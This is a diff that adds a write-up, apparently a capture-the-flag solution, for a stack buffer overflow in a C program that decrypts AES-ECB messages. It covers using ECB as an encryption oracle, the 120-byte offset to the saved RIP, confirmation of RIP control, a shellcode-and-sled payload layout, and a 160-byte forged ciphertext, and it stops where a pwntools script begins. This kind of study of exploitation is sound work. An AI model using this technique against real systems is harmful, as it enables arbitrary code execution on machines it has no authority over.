@@ -1,3 +1,94 @@
+### 1. The bug
+
+### The C program:
+- verifies only the first decrypted block
+- then restarts AES
+- then decrypts the rest into plaintext.message
+- but plaintext.message is only 53 bytes
+
+So a long decrypted body overflows the stack.
+
+### 2. Why ECB matters
+
+With ECB:
+- each 16-byte block is encrypted independently
+
+So when dispatch encrypts a 16-byte message:
+- block 1 = valid VERIFIED || len
+- block 2 = encryption of your chosen 16 bytes
+- block 3 = encryption of the PKCS#7 padding block
+
+That gave me an encryption oracle for arbitrary 16-byte plaintext blocks.
+
+### 3. Offset to RIP
+
+From the stack dump:
+- message starts at 0x7fffffffe840
+- saved RIP is at 0x7fffffffe8b8
+
+**Difference:**
+```
+    0x78 == 120
+```
+So:
+```
+    bytes 0..119 = pre-RIP area
+    bytes 120..127 = overwritten RIP
+```
+
+### 4. RIP control
+
+- My BBBBBBBB control test showed:
+```
+    saved RIP became 0x4242424242424242
+```
+- So my forged ciphertext really does control RIP.
+
+### 5. Shellcode fit
+
+- My shellcode length:
+```
+    len(sc) == 66
+```
+- With a 16-byte sled:
+```
+    16 + 66 = 82 <= 120
+```
+- So it fits before RIP.
+
+**The body structure**
+
+- This is the key layout:
+```
+pre_rip = sled + sc
+body = pre_rip.ljust(120, b"A") + p64(target_address)
+```
+Why?
+```
+    pad to 120 to reach RIP
+    then append 8 bytes for RIP
+    total body = 128 bytes
+```
+**My ciphertext structure**
+
+- Conceptually:
+```
+forged = first_block + Enc(P0) + Enc(P1) + ... + Enc(P7) + pad_block
+```
+- where:
+```
+    P0..P7 are the 8 chunks of your 128-byte body
+    first_block comes from dispatch block 1
+    each Enc(Pi) comes from dispatch block 2 for that chunk
+    pad_block comes from dispatch block 3
+```
+- That is why the final payload length is:
+```
+    16 + 8*16 + 16 = 160
+```
+
+### Python Script to Solve
+
 ```python
 from pwn import *
 
